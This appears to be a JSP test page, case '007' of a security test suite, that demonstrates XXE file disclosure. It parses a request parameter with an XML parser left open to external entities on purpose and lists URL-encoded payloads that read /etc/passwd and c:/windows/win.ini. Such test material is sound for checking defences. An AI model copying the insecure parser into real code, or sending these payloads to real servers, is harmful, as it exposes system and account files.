<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page import="org.xml.sax.helpers.DefaultHandler" %>
<%@ page import="org.xml.sax.*" %>
<%@ page import="javax.xml.parsers.*" %>
<%@ page import="java.io.StringReader" %>
<%
    class MyHandler extends DefaultHandler {
        @Override
        public void startDocument() throws SAXException {
            super.startDocument();
        }

        @Override
        public void endDocument() throws SAXException {
            super.endDocument();
        }

        @Override
        public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            super.startElement(uri, localName, qName, attributes);
            if ("foo".equals(qName)) {
                attributes.getValue(qName);
            }
        }

        @Override
        public void endElement(String uri, String localName, String qName) throws SAXException {
            super.endElement(uri, localName, qName);

        }

        @Override
        public void characters(char[] ch, int start, int length) throws SAXException {
            super.characters(ch, start, length);
        }
    }
%>
<%
    String linux_querystring = "?data=%3C%3F%78%6D%6C%20%76%65%72%73%69%6F%6E%3D%22%31%2E%30%22%20%65%6E%63%6F%64%69%6E%67%3D%22%49%53%4F%2D%38%38%35%39%2D%31%22%3F%3E%3C%21%44%4F%43%54%59%50%45%20%66%6F%6F%20%5B%20%20%20%3C%21%45%4C%45%4D%45%4E%54%20%66%6F%6F%20%41%4E%59%20%3E%20%20%3C%21%45%4E%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4D%20%22%66%69%6C%65%3A%2F%2F%2F%65%74%63%2F%70%61%73%73%77%64%22%20%3E%5D%3E%3C%66%6F%6F%3E%26%78%78%65%3B%3C%2F%66%6F%6F%3E";
    String windows_querystring = "?data=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%20%20%20%3C%21ELEMENT%20foo%20ANY%20%3E%20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22%20%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E";
    String data = request.getParameter("data");
    String tmp = "";
    if (data != null) {
        try {
            SAXParserFactory factory = SAXParserFactory.newInstance();
            SAXParser parser = factory.newSAXParser();
            XMLReader reader = parser.getXMLReader();
            reader.setContentHandler(new MyHandler());
            reader.parse(new InputSource(new StringReader(request.getParameter("data"))));
        } catch (Exception e) {
            out.print(e);
        }
    }
%>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>007 XXE 漏洞测试</title>

</head>

<body>
<h1>007 - 通过XXE读取系统文件</h1>

<p>不正常调用 - Linux (读取 /etc/passwd)</p>
<p>curl '<a href="<%=request.getRequestURL()+linux_querystring%>" target="_blank"><%=request.getRequestURL()+linux_querystring%></a>'</p>

<p>不正常调用 - Windows (读取 c:/windows/win.ini)</p>
<p>curl '<a href="<%=request.getRequestURL()+windows_querystring%>" target="_blank"><%=request.getRequestURL()+windows_querystring%></a>'</p>

<p>节点内容: <%= tmp %></p>
<p>(有漏洞会看到文件内容)</p>
</body>
</body>
</html>
